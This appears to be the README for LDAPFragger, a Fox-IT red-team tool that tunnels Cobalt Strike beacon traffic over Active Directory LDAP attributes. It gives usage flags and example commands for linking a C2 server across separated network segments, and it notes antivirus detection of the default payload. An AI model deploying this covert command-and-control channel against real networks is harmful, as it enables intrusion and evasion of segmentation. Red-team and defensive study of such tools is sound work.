# LDAPFragger

LDAPFragger is a Command and Control tool that enables attackers to route Cobalt Strike beacon data over LDAP using user attributes.

For background information, read the release blog: http://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes


## Dependencies and installation
* Compiled with `.NET 4.0`, but may work with older and newer .NET frameworks as well

## Usage

```
 _     _              __
| |   | |            / _|
| | __| | __ _ _ __ | |_ _ __ __ _  __ _  __ _  ___ _ __
| |/ _` |/ _` | '_ \|  _| '__/ _` |/ _` |/ _` |/ _ \ '__|
| | (_| | (_| | |_) | | | | | (_| | (_| | (_| |  __/ |
|_|\__,_|\__,_| .__/|_| |_|  \__,_|\__, |\__, |\___|_|
              | |                   __/ | __/ |
              |_|                  |___/ |___/

Fox-IT - Rindert Kramer

Usage:
     --cshost:  IP address or hostname of the Cobalt Strike instance
     --csport:  Port of the external C2 interface on the Cobalt Strike server
     -u:        Username to connect to Active Directory
     -p:        Password to connect to Active Directory
     -d:        FQDN of the Active Directory domain
     --ldaps:   Use LDAPS instead of LDAP
     -v:        Verbose output
     -h:        Display  this message

If no AD credentials are provided, integrated AD authentication will be used.
```

Example usage:

![](https://foxitsecurity.files.wordpress.com/2020/03/9.png?w=607) 


From network segment A, run
```
LDAPFragger --cshost <Cobalt Strike IP> --csport <External listener port>

LDAPFragger --cshost <Cobalt Strike IP> --csport <External listener port> -u <username> -p <password> -d <domain FQDN>
```

From network segment B, run
```
LDAPFragger 

LDAPFragger -u <username> -p <password> -d <domain FQDN>
```


LDAPS can be used with the `--LDAPS` flag, however, regular LDAP traffic is encrypted as well. Please do note that the default Cobalt Strike payload will get caught by most AVs.



